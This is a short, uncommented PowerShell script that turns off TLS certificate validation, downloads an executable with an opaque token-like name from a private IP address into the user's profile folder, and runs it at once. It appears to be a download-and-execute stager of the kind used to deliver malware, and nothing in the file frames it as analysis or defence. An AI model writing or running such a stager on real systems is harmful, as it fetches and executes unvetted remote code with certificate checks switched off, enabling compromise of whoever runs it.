$url = "https://192.168.68.21/x64/SC-wKhEFScTT6dIeqFGO0EzTq47_8Q__fu2HP9VS4va1kKhiwYuGXUEAAE-.exe"
$path = "$env:UserProfile\SC-wKhEFScTT6dIeqFGO0EzTq47_8Q__fu2HP9VS4va1kKhiwYuGXUEAAE-.exe"
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webClient = new-object System.Net.WebClient
$webClient.DownloadFile( $url, $path )
start $path
